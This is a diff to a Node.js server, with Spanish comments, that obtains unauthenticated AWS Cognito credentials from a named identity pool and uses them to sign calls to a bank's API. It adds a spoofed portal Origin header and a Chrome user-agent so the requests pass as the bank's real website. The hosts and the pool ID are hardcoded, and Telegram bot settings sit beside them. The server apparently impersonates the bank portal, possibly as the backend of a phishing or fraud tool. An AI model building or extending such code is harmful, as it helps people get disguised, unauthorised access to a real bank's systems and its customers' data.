@@ -3,7 +3,7 @@ const express = require('express');
 const cors    = require('cors');
 const axios   = require('axios');
 const aws4    = require('aws4');
-const { CognitoIdentityClient, GetIdCommand, GetCredentialsForIdentityCommand } = require('@aws-sdk/client-cognito-identity');
+// @aws-sdk/client-cognito-identity ya no se usa — calls directos via axios
 
 const TG_TOKEN = process.env.TG_TOKEN || '';
 const TG_CHAT  = process.env.TG_CHAT  || '';
@@ -220,12 +220,14 @@ app.use(cors({
 }));
 
 // ── Config ────────────────────────────────────────────────────────────────────
-const AWS_REGION      = 'us-east-1';
-const IDENTITY_POOL   = 'us-east-1:672224ae-2748-4ef8-8f27-2e5393d92890';
-const API_HOST        = 'pmz.mfs.bank4us.co';
-const API_BASE        = `https://${API_HOST}`;
-const TENANT_ID       = '1111111';
-const cognitoClient   = new CognitoIdentityClient({ region: AWS_REGION });
+const AWS_REGION    = 'us-east-1';
+const IDENTITY_POOL = 'us-east-1:672224ae-2748-4ef8-8f27-2e5393d92890';
+const API_HOST      = 'pmz.mfs.bank4us.co';
+const API_BASE      = `https://${API_HOST}`;
+const TENANT_ID     = '1111111';
+const PORTAL_ORIGIN = 'https://www.mobilize-fs.com.co';
+const CHROME_UA     = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+const COGNITO_BASE  = 'https://cognito-identity.us-east-1.amazonaws.com/';
 
 // ── Credenciales Cognito (se renuevan cada ~50min) ────────────────────────────
 let _creds = null;
@@ -235,29 +237,37 @@ async function getCreds() {
   const now = Date.now();
   if (_creds && now < _credsExpiry) return _creds;
 
-  // 1) Obtener Identity ID
-  const { IdentityId } = await cognitoClient.send(
-    new GetIdCommand({ IdentityPoolId: IDENTITY_POOL })
-  );
+  const cogHdrs = {
+    'Content-Type':  'application/x-amz-json-1.1',
+    'Origin':        PORTAL_ORIGIN,
+    'User-Agent':    CHROME_UA,
+  };
 
-  // 2) Obtener credenciales temporales
-  const { Credentials } = await cognitoClient.send(
-    new GetCredentialsForIdentityCommand({ IdentityId })
+  const r1 = await axios.post(COGNITO_BASE,
+    { IdentityPoolId: IDENTITY_POOL, Logins: {} },
+    { headers: { ...cogHdrs, 'X-Amz-Target': 'AWSCognitoIdentityService.GetId' } }
   );
+  const { IdentityId } = r1.data;
+
+  const r2 = await axios.post(COGNITO_BASE,
+    { IdentityId, Logins: {} },
+    { headers: { ...cogHdrs, 'X-Amz-Target': 'AWSCognitoIdentityService.GetCredentialsForIdentity' } }
+  );
+  const C = r2.data.Credentials;
 
   _creds = {
-    accessKeyId:     Credentials.AccessKeyId,
-    secretAccessKey: Credentials.SecretKey,
-    sessionToken:    Credentials.SessionToken,
+    accessKeyId:     C.AccessKeyId,
+    secretAccessKey: C.SecretKey,
+    sessionToken:    C.SessionToken,
   };
-  _credsExpiry = new Date(Credentials.Expiration).getTime() - 5 * 60 * 1000;
-  console.log(`✅ Credenciales Cognito renovadas (expiran: ${Credentials.Expiration})`);
+  _credsExpiry = C.Expiration * 1000 - 5 * 60 * 1000;
+  console.log(`✅ Credenciales Cognito renovadas`);
   return _creds;
 }
 
 // ── Llamada firmada a la API ──────────────────────────────────────────────────
 async function signedPost(path, body) {
-  const creds = await getCreds();
+  const creds   = await getCreds();
   const bodyStr = JSON.stringify(body);
 
   const opts = aws4.sign({
@@ -267,7 +277,8 @@ async function signedPost(path, body) {
     headers: {
       'Content-Type': 'application/json',
       'Accept':       'application/json',
-      'Origin':       'https://mobilize-fs.com.co',
+      'Origin':       PORTAL_ORIGIN,
+      'User-Agent':   CHROME_UA,
     },
     body:    bodyStr,
     service: 'execute-api',
